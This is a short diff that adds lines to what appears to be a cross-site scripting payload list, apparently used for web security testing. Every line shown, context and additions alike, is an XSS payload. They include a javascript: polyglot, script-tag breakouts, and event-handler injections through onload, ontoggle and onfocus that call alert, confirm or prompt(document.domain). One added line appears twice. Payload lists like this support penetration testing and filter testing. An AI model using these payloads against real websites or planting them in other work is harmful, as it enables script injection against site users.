@@ -1177,3 +1177,6 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmo
 </script%0a><script%0a>confirm(1)</script%0a>
 <details open ontoggle=alert(1)>
 <svg onload=+~-!alert(1)>
+<div onfocus=alert('xx') id=xss style=display:table>
+<img class="emoji" alt="😯" src="x" /><svg onload=prompt(document.domain)>
+<div onfocus=alert('xx') id=xss style=display:table>
